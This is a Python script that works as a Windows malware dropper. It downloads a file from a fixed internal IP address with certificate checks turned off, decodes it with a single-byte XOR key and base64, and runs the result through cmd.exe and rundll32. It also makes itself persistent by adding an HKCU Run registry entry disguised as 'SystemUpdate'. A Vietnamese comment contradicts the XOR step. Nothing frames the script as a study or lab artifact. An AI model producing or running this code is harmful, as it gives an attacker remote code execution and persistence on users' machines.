#!/usr/bin/env python3
import sys, json, time, base64, subprocess, os
import requests
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    url = "https://192.168.100.1/update/config.bin"
    try:
        response = requests.get(url, stream=True, timeout=30, verify=False)
        response.raise_for_status()
        content = b""
        for chunk in response.iter_content(8192):
            content += chunk
        if len(content) == 0:
            raise ValueError("Downloaded file is empty")
        result = {"content": content.hex()}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Content từ T1 chưa bị XOR — chỉ cần base64 decode
        content = bytes.fromhex(input_data.get('content', ''))
        # XOR decode với key 0x41
        xor_key = 0x41
        xored = bytes(b ^ xor_key for b in content)
        # Base64 decode
        decoded_content = base64.b64decode(xored).decode('utf-8')
        return {'success': True, 'data': {"decoded_content": decoded_content},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        decoded_content = input_data.get('decoded_content', 'whoami')
        # Execute via cmd.exe
        subprocess.run(['cmd.exe', '/c', decoded_content],
                      capture_output=True, text=True, timeout=30)
        # Execute via rundll32.exe
        subprocess.run(['rundll32.exe', 'shell32.dll,ShellExec_RunDLL', decoded_content],
                      capture_output=True, timeout=30)
        return {'success': True, 'data': {},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    try:
        exe_path = os.path.abspath(sys.argv[0])
        import winreg
        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0,
                           winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, exe_path)
            val, _ = winreg.QueryValueEx(key, 'SystemUpdate')
            registered = (val == exe_path)
        return {'success': True, 'data': {'registered': registered},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'registered': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    outputs, results, failed = {}, {}, []

    # T4 chạy độc lập trước — không cần T1
    try:
        r = task_T4(None)
        results['T4'] = r
        outputs['T4'] = r.get('data', {})
        print(f'[+] T4: {"OK" if r.get("success") else "FAILED — " + r.get("error","?")}')
        if not r.get('success'):
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')

    # T1: Download
    try:
        r = task_T1(None)
        results['T1'] = r
        outputs['T1'] = r.get('data', {})
        print(f'[+] T1: {"OK" if r.get("success") else "FAILED — " + r.get("error","?")}')
        if not r.get('success'):
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')

    # T2: Decode — chỉ chạy nếu T1 ok
    if 'T1' not in failed and outputs.get('T1'):
        try:
            r = task_T2(outputs.get('T1', {}))
            results['T2'] = r
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2: {"OK" if r.get("success") else "FAILED — " + r.get("error","?")}')
            if not r.get('success'):
                failed.append('T2')
        except Exception as e:
            print(f'[!] T2 crashed: {e}')
            failed.append('T2')

    # T3: Execute — chỉ chạy nếu T2 ok
    if 'T2' not in failed and outputs.get('T2'):
        try:
            r = task_T3(outputs.get('T2', {}))
            results['T3'] = r
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3: {"OK" if r.get("success") else "FAILED — " + r.get("error","?")}')
            if not r.get('success'):
                failed.append('T3')
        except Exception as e:
            print(f'[!] T3 crashed: {e}')
            failed.append('T3')

    success = len(failed) == 0
    print(f'[{"+" if success else "-"}] Done. Failed: {failed}')
    return {'success': success, 'failed': failed, 'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings()
    result = main()
    print('__RESULT__=' + json.dumps(result))
